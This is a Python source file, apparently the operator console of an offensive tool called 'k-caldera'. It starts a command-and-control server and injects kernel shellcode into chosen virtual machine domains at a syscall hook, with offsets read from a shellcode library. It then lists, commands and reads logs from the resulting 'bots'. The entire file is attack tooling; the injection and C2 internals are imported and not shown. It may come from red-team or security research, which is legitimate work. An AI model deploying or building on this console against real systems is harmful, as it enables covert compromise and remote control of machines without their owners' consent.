from vm_drivers import list_domains, inject_domain, InvalidDomain, InvalidSyscall
from config.conf_manager import read_config
from c2.c2_server import start_multithreaded_c2, list_c2_connections, send_c2_command, read_c2_log, InvalidConnUUID, NotAliveConnection
import datetime


def command_line_interface(config, offsets):
    # TODO: use 'argparse' if this is going to be more than a prototype
    server = start_c2(config)
    options = ["domlist", "dominject", "c2list", "c2send", "c2read", "quit", "help"]
    while True:
        print("k-caldera> ", end="")
        choice = input().strip()
        if choice == 'help':
            print(f"Available commands, all without arguments: {', '.join(options)}")
        elif choice == 'quit':
            print("Bye bye, C2 server will be stopped")
            break
        elif choice == 'c2read':
            print("Send connection UUID: ", end="")
            conn_uuid = input().strip()
            try:
                data = read_c2_log(conn_uuid)
                print(data)
            except InvalidConnUUID:
                print("Invalid connection UUID")
        elif choice == 'c2send':
            print("Send connection UUID: ", end="")
            conn_uuid = input().strip()
            print("Type your command with its arguments: ", end="")
            cmd = input()
            try:
                send_c2_command(conn_uuid, cmd)
            except InvalidConnUUID:
                print("Invalid connection UUID")
            except NotAliveConnection:
                print("Can't send commands to dead bots")
        elif choice == 'c2list':
            conn_tuples = list_c2_connections()
            print("Connection UUID\t\t\t\tClient address\t\tLast seen\t\t\tIs Alive")
            for conn in conn_tuples:
                last_seen = datetime.datetime.fromtimestamp(conn[2]).ctime()
                new_conn = '\t'.join((conn[0], str(conn[1]), last_seen, 'Yes' if conn[3] else 'No'))
                print(new_conn)
        elif choice == 'dominject':
            print("Choose which domain to inject: ", end="")
            domain = input().strip()
            try:
                inject_domain(domain, config, offsets)
            except InvalidDomain:
                print("Invalid domain")
            except InvalidSyscall:
                print("Syscall injection point not found")
        elif choice == 'domlist':
            domains = list_domains(config)
            print(", ".join(domains))
        else:
            print("Invalid command")
    stop_c2(server)


def start_c2(config):
    print('[+] Starting C2 Server')
    server = start_multithreaded_c2(config)
    print('[+] Done')
    return server


def stop_c2(server):
    server.shutdown()


if __name__ == "__main__":
    config = read_config('/usr/src/app/config/config.json')
    offsets = read_config('/usr/src/app/kernel_shellcode_library/offsets.json')
    command_line_interface(config, offsets)
